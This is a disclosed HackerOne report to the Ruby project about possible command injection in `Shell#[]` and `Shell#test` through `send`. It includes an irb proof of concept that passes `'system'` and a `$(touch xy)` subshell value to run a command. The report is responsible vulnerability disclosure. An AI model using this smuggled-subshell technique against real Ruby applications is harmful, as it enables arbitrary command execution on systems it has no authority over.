# Potential command injection in `Shell#[]` and `Shell#test`

## Report Details
- **Report ID**: 327512
- **URL**: https://hackerone.com/reports/327512
- **State**: Closed
- **Severity**: none
- **Submitted**: 2018-03-19T20:33:10.989Z
- **Disclosed**: 2019-10-16T23:15:28.407Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
As `Shell#test` and `Shell#[]` use `send` when transferring to FileTest, private methods etc. can also be called. Therefore, command injection is possible when a crafted value is passed.

```ruby
$ irb
irb(main):001:0> `ls xy`
ls: xy: No such file or directory
=> ""

irb(main):002:0> require 'shell'
=> true
irb(main):003:0> sh = Shell.new
=> #<Shell:0x00007fc0c20f2a78>
irb(main):004:0> sh['system', '$(touch xy)']
sh: /private/tmp/: is a directory
=> false

irb(main):005:0> `ls xy`
=> "xy\n"
```

Since send is executed after the file path is converted to absolute path, it is difficult with `instance_eval` and `open` etc, but you can execute it using a subshell.

## Impact

It seems almost unlikely that user input is given for the purpose, so it probably will not be affected in most cases.
It may be feasible under complex conditions such as combining object injection and other problems.

## Attachments
No attachments
